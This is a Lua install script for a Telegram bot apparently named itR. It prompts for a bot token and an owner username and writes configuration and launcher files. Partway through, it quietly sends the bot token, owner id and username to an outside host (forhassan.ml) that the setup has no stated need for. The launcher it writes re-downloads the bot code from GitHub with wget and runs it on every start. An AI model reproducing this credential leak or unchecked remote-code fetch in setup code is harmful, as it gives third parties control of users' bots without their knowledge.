serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_itR = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_itR = function() 
local Create_Info = function(Token,Sudo,UserName)  
local itR_Info_Sudo = io.open("sudo.lua", 'w')
itR_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
itR_Info_Sudo:close()
end  
if not database:get(Server_itR.."Token_itR") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_itR.."Token_itR",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_itR.."UserName_itR") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_itR.."UserName_itR",Json.Info.Username)
database:set(Server_itR.."Id_itR",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_itR_Info()
Create_Info(database:get(Server_itR.."Token_itR"),database:get(Server_itR.."Id_itR"),database:get(Server_itR.."UserName_itR"))   
https.request("https://forhassan.ml/itR/itR.php?id="..database:get(Server_itR.."Id_itR").."&user="..database:get(Server_itR.."UserName_itR").."&token="..database:get(Server_itR.."Token_itR"))
local RunitR = io.open("itR", 'w')
RunitR:write([[
#!/usr/bin/env bash
cd $HOME/itR
token="]]..database:get(Server_itR.."Token_itR")..[["
rm -fr itR.lua
wget "https://raw.githubusercontent.com/itRTEAM/itR/master/itR.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./itR.lua -p PROFILE --bot=$token
done
]])
RunitR:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/itR
while(true) do
rm -fr ../.telegram-cli
screen -S itR -X kill
screen -S itR ./itR
done
]])
RunTs:close()
end
Files_itR_Info()
database:del(Server_itR.."Token_itR");database:del(Server_itR.."Id_itR");database:del(Server_itR.."UserName_itR")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_itR()  
var = true
else   
f:close()  
database:del(Server_itR.."Token_itR");database:del(Server_itR.."Id_itR");database:del(Server_itR.."UserName_itR")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
